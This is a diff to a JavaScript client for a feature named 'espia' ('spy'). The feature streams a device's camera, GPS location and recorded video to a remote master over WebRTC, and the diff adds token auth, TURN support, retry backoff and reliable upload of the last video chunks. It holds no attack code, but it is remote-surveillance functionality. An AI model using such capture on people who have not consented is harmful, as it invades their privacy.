@@ -2332,10 +2332,12 @@ const Session = (() => {
         try {
           const url = window.WH_CONFIG?.mosGasUrl;
           if (!url) return null;
-          const r = await fetch(url, {
-            method: 'POST',
-            body: JSON.stringify(Object.assign({ action: accion }, params))
-          });
+          // [v2.13.80] Inyectar token HMAC automáticamente. Endpoints sensibles
+          // del backend lo exigen (compat: si no llega, log warning + permitir).
+          const body = Object.assign({ action: accion }, params || {});
+          const token = window._espiaCliWH?.token;
+          if (token && body.token === undefined) body.token = token;
+          const r = await fetch(url, { method: 'POST', body: JSON.stringify(body) });
           return await r.json();
         } catch(_) { return null; }
       }
@@ -2375,8 +2377,42 @@ const Session = (() => {
           sesionId, masterId, deviceId: deviceIdLocal,
           pc: null, streams: {}, gpsWatch: null, gpsCh: null,
           iceDesde: 0, bufferRecorders: {}, bufferTimers: {},
-          pollTimerOferta: null, pollTimerIce: null, pollTimerEstado: null
+          pollTimerSync: null,
+          // [v2.13.80] Handshake con backend antes de iniciar WebRTC: pide
+          // token HMAC para autenticar y obtiene los iceServers (TURN opcional).
+          token: null,
+          // Cola de ICE locales — se vuelca cada 250ms vía espiaPushBatch
+          _iceQueue: [],
+          _iceFlushTimer: null,
+          // Backoff exponencial del sync poll en caso de errores consecutivos
+          _consErrores: 0,
+          _ticksAEsperar: 0,
+          // Watchdog de ICE failed para reconnect/cierre graceful
+          _iceFailedDesde: 0,
+          _iceWatchdogTimer: null
         };
+        // [v2.13.80] Handshake auth + config — paralelo para latencia mínima.
+        // El device prueba su identidad (deviceId coincide con la sesión) y
+        // a cambio recibe token HMAC + lista de iceServers (TURN si disponible).
+        let iceServers = [{ urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }];
+        try {
+          const [rTok, rCfg] = await Promise.all([
+            _espiaCliWHPost('espiaIniciarDispositivo', { sesionId, deviceId: deviceIdLocal }),
+            _espiaCliWHPost('espiaConfig', {})
+          ]);
+          if (rTok?.data?.token) {
+            window._espiaCliWH.token = rTok.data.token;
+            console.log('[espia WH] handshake OK · token recibido');
+          } else {
+            console.warn('[espia WH] handshake sin token (compat mode):', rTok?.error || 'response vacío');
+          }
+          if (Array.isArray(rCfg?.data?.iceServers) && rCfg.data.iceServers.length) {
+            iceServers = rCfg.data.iceServers;
+            if (rCfg.data.tieneTurn) console.log('[espia WH] TURN disponible');
+          }
+        } catch(eH) { console.warn('[espia WH] handshake fallo:', eH?.message); }
+        if (!window._espiaCliWH) return; // por si cerraron mid-handshake
+        window._espiaCliWH._iceServers = iceServers;
         try {
           // [v2.13.63] facingMode fallback cascada (algunas tablets WH no tienen frontal)
           const _camVariants = [
@@ -2407,22 +2443,38 @@ const Session = (() => {
             await window._espiaCliWHCerrar('sin_streams');
             return;
           }
-          const pc = new RTCPeerConnection({
-            iceServers: [{ urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }]
-          });
+          // [v2.13.80] iceServers vienen del backend (incluye TURN si configurado).
+          // Permite conectar detrás de NAT simétrico (~10% de redes).
+          const pc = new RTCPeerConnection({ iceServers: window._espiaCliWH._iceServers });
           window._espiaCliWH.pc = pc;
           // Flag para que onnegotiationneeded no dispare en el setup inicial
           window._espiaCliWH._setupInicialDone = false;
           window._espiaCliWH._renegEnCurso = false;
           window._espiaCliWH._ultimaReneg = 0;
-          // [v2.13.75 BLINDAJE] Recovery automatico ICE failed
+          // [v2.13.80] ICE recovery + watchdog. Si ICE failed persiste >30s,
+          // cerrar limpio (master verá CERRADA via su sync poll y notificará).
+          // Antes solo restartIce → quedaba en limbo si el problema era NAT.
           pc.oniceconnectionstatechange = () => {
             console.log('[espia WH] ICE state:', pc.iceConnectionState);
+            const ref = window._espiaCliWH;
+            if (!ref) return;
             if (pc.iceConnectionState === 'failed') {
-              console.warn('[espia WH] ICE failed · intentando restart');
+              if (!ref._iceFailedDesde) ref._iceFailedDesde = Date.now();
+              console.warn('[espia WH] ICE failed · restartIce');
               try { pc.restartIce(); } catch(eR) { console.warn('[espia WH] restartIce fallo:', eR.message); }
+            } else if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
+              ref._iceFailedDesde = 0;
             }
           };
+          // Watchdog cada 5s: si ICE failed >30s sin recuperar → cierre graceful
+          window._espiaCliWH._iceWatchdogTimer = setInterval(() => {
+            const ref = window._espiaCliWH;
+            if (!ref || !ref._iceFailedDesde) return;
+            if (Date.now() - ref._iceFailedDesde > 30000) {
+              console.warn('[espia WH] ICE failed >30s · cerrando para forzar reconexión');
+              window._espiaCliWHCerrar('ice_failed_persistente');
+            }
+          }, 5000);
           if (window._espiaCliWH.streams.userMedia) {
             window._espiaCliWH.streams.userMedia.getTracks().forEach(t => pc.addTrack(t, window._espiaCliWH.streams.userMedia));
           }
@@ -2541,8 +2593,15 @@ const Session = (() => {
               const x = Math.sin(Δφ/2)**2 + Math.cos(φ1)*Math.cos(φ2)*Math.sin(Δλ/2)**2;
               return 2 * R * Math.atan2(Math.sqrt(x), Math.sqrt(1-x));
             };
+            const GPS_BACKPRESSURE_BYTES = 1024 * 1024; // 1MB
             const _enviarGps = (cur, src) => {
               if (gpsCh.readyState !== 'open') { console.log('[espia WH gps] channel no open, esperando:', gpsCh.readyState); return; }
+              // [v2.13.80] Backpressure — si el master está lento, bufferedAmount
+              // crece sin techo y consume RAM del cliente. Skip si >1MB encolado.
+              if (gpsCh.bufferedAmount > GPS_BACKPRESSURE_BYTES) {
+                console.warn('[espia WH gps] backpressure: buffered=' + gpsCh.bufferedAmount + 'B, skip');
+                return;
+              }
               try {
                 gpsCh.send(JSON.stringify(cur));
                 console.log('[espia WH gps] enviado (' + src + '):', cur.lat.toFixed(5), cur.lng.toFixed(5), '±' + Math.round(cur.acc) + 'm');
@@ -2584,16 +2643,27 @@ const Session = (() => {
           } else {
             console.warn('[espia WH gps] navigator.geolocation no disponible');
           }
+          // [v2.13.80] ICE batch — ICE gathering puede emitir 5-15 candidates
+          // en 100ms. Antes era 1 fetch + lock Sheets por candidate. Ahora se
+          // encolan y se mandan en bloques cada 250ms vía espiaPushBatch:
+          // 1 lock por flush, no N. Reduce dramáticamente la contención de Sheets.
           pc.onicecandidate = (ev) => {
-            // [v2.13.78] Guard contra cierre: si la sesión cerró entre el ICE
-            // gathering y este callback, no spammear al backend con candidates
-            // de un PC ya muerto.
-            if (!window._espiaCliWH || !ev.candidate) return;
-            _espiaCliWHPost('espiaAgregarIce', {
-              sesionId, lado: 'device',
-              ice: ev.candidate.toJSON ? ev.candidate.toJSON() : ev.candidate
-            });
+            const ref = window._espiaCliWH;
+            if (!ref || !ev.candidate) return;
+            const c = ev.candidate.toJSON ? ev.candidate.toJSON() : ev.candidate;
+            ref._iceQueue.push(c);
           };
+          window._espiaCliWH._iceFlushTimer = setInterval(async () => {
+            const ref = window._espiaCliWH;
+            if (!ref || !ref._iceQueue.length) return;
+            const batch = ref._iceQueue.splice(0, ref._iceQueue.length);
+            try {
+              await _espiaCliWHPost('espiaPushBatch', {
+                sesionId, lado: 'device',
+                ice: batch.map(c => ({ ice: c }))
+              });
+            } catch(eF) { console.warn('[espia WH ice flush]', eF?.message); }
+          }, 250);
           pc.onconnectionstatechange = () => {
             if (pc.connectionState === 'failed' || pc.connectionState === 'closed') {
               window._espiaCliWHCerrar('connection_' + pc.connectionState);
@@ -2612,6 +2682,9 @@ const Session = (() => {
           window._espiaCliWH.pollTimerSync = setInterval(async () => {
             const ref = window._espiaCliWH;
             if (!ref || ref._pollSyncEnCurso) return;
+            // [v2.13.80] Backoff exponencial — si Apps Script tira errores
+            // consecutivos, saltamos ticks para no quemar cuota. Reset al primer 200.
+            if (ref._ticksAEsperar > 0) { ref._ticksAEsperar--; return; }
             ref._pollSyncEnCurso = true;
             try {
               const yaConectado = !!pc.remoteDescription;
@@ -2683,8 +2756,17 @@ const Session = (() => {
                 }
                 if (window._espiaCliWH && d.tsMax) window._espiaCliWH.iceDesde = d.tsMax;
               }
+              // Reset backoff al primer round-trip exitoso
+              if (window._espiaCliWH && window._espiaCliWH._consErrores > 0) {
+                window._espiaCliWH._consErrores = 0;
+              }
             } catch(e) {
               if (e?.message) console.warn('[espia WH sync]', e.message);
+              if (window._espiaCliWH) {
+                window._espiaCliWH._consErrores++;
+                // Backoff: 1, 2, 4, 8 ticks de 700ms hasta tope ~10s
+                window._espiaCliWH._ticksAEsperar = Math.min(14, Math.pow(2, window._espiaCliWH._consErrores) - 1);
+              }
             } finally {
               if (window._espiaCliWH) window._espiaCliWH._pollSyncEnCurso = false;
             }
@@ -2764,37 +2846,71 @@ const Session = (() => {
         console.log('[espia WH] cerrando:', motivo);
         const ref = window._espiaCliWH;
         window._espiaCliWH = null;
-        // [v2.13.79] Limpiar el poller consolidado + timers heredados (defensivo
-        // por si alguna instancia vieja todavía los tiene; idempotente)
+        // [v2.13.80] Limpiar TODOS los timers (sync, ICE flush, watchdog, reneg, legacy)
         try { clearInterval(ref.pollTimerSync); } catch(_){}
+        try { clearInterval(ref._iceFlushTimer); } catch(_){}
+        try { clearInterval(ref._iceWatchdogTimer); } catch(_){}
         try { clearInterval(ref.pollTimerOferta); } catch(_){}
         try { clearInterval(ref.pollTimerIce); } catch(_){}
         try { clearInterval(ref.pollTimerEstado); } catch(_){}
         try { clearTimeout(ref._renegTimeout); } catch(_){}
-        Object.entries(ref.bufferRecorders || {}).forEach(([_, rec]) => {
-          try { if (rec.state === 'recording') rec.stop(); } catch(_){}
+        // [v2.13.80] Flush final ICE pendientes (best-effort)
+        if (ref._iceQueue?.length && ref.sesionId && ref.token) {
+          try {
+            await _espiaCliWHPost.call(null, 'espiaPushBatch', {
+              sesionId: ref.sesionId, lado: 'device', token: ref.token,
+              ice: ref._iceQueue.map(c => ({ ice: c }))
+            });
+          } catch(_){}
+        }
+        // [v2.13.80] AWAIT MediaRecorder stops para que el último chunk se suba.
+        // Antes: rec.stop() es async (dispara onstop con el blob final), pero
+        // pc.close() ocurría inmediato después → onstop interrumpido → último
+        // 0-5min de video perdido. Ahora esperamos a que todos terminen.
+        const stopPromises = Object.entries(ref.bufferRecorders || {}).map(([_, rec]) => {
+          return new Promise(resolve => {
+            if (!rec || rec.state !== 'recording') return resolve();
+            const onStopOnce = () => resolve();
+            rec.addEventListener('stop', onStopOnce, { once: true });
+            try { rec.stop(); } catch(_) { resolve(); }
+            // safety timeout: si por algún motivo onstop no dispara en 6s, seguir
+            setTimeout(() => resolve(), 6000);
+          });
         });
+        await Promise.all(stopPromises);
         Object.values(ref.bufferTimers || {}).forEach(t => { try { clearInterval(t); } catch(_){} });
         Object.values(ref.streams || {}).forEach(s => {
           try { s?.getTracks().forEach(t => t.stop()); } catch(_){}
         });
         if (ref.gpsWatch) try { navigator.geolocation.clearWatch(ref.gpsWatch); } catch(_){}
+        // Cerrar gpsCh explícito (libera SCTP)
+        if (ref.gpsCh) try { ref.gpsCh.close(); } catch(_){}
         try { ref.pc?.close(); } catch(_){}
         if (ref.sesionId) {
-          _espiaCliWHPost('espiaCerrarSesion', { sesionId: ref.sesionId, motivo: motivo || 'manual', lado: 'device' });
+          _espiaCliWHPost.call(null, 'espiaCerrarSesion', {
+            sesionId: ref.sesionId, motivo: motivo || 'manual', lado: 'device', token: ref.token
+          });
         }
         _espiaCliWHOcultarIndicador();
       };
       window.addEventListener('beforeunload', () => {
-        if (window._espiaCliWH?.sesionId) {
-          try {
-            navigator.sendBeacon(window.WH_CONFIG?.mosGasUrl || '', JSON.stringify({
-              action: 'espiaCerrarSesion',
-              sesionId: window._espiaCliWH.sesionId,
-              motivo: 'page_unload', lado: 'device'
-            }));
-          } catch(_){}
-        }
+        const ref = window._espiaCliWH;
+        if (!ref?.sesionId) return;
+        // [v2.13.80] sendBeacon con Blob application/json para que el backend
+        // doPost parsee correctamente. Antes sendBeacon de string crudo enviaba
+        // Content-Type text/plain → en raras ocasiones Apps Script ignoraba el
+        // body → cierre nunca se registraba en RTC_SIGNALING.
+        try {
+          const url = window.WH_CONFIG?.mosGasUrl || '';
+          const payload = JSON.stringify({
+            action: 'espiaCerrarSesion',
+            sesionId: ref.sesionId,
+            motivo: 'page_unload', lado: 'device',
+            token: ref.token
+          });
+          const blob = new Blob([payload], { type: 'application/json' });
+          navigator.sendBeacon(url, blob);
+        } catch(_){}
       });
 
       // Handler de primer plano (la app está abierta).
